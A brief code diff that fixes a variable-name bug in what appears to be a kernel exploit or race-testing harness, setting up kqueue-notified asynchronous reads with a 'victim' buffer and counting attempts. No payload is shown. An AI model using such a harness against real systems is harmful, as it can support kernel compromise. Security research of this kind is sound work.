@@ -1508,13 +1508,13 @@ NSString *ModAioKevent(void) {
         memset(&rs_aio_cb, 0, sizeof rs_aio_cb);
         memset(rs_aio_rcb, 0, sizeof rs_aio_rcb);
 
-        cb.aio_fildes = fd;
-        cb.aio_offset = 0;
-        cb.aio_buf = vbuf;
-        cb.aio_nbytes = VICTIM_NB;
-        cb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
-        cb.aio_sigevent.sigev_signo = kq;
-        cb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAAA1;
+        rs_aio_cb.aio_fildes = fd;
+        rs_aio_cb.aio_offset = 0;
+        rs_aio_cb.aio_buf = vbuf;
+        rs_aio_cb.aio_nbytes = VICTIM_NB;
+        rs_aio_cb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
+        rs_aio_cb.aio_sigevent.sigev_signo = kq;
+        rs_aio_cb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAAA1;
 
         if (aio_read(&rs_aio_cb) != 0) { silent++; continue; }
         attempts++;
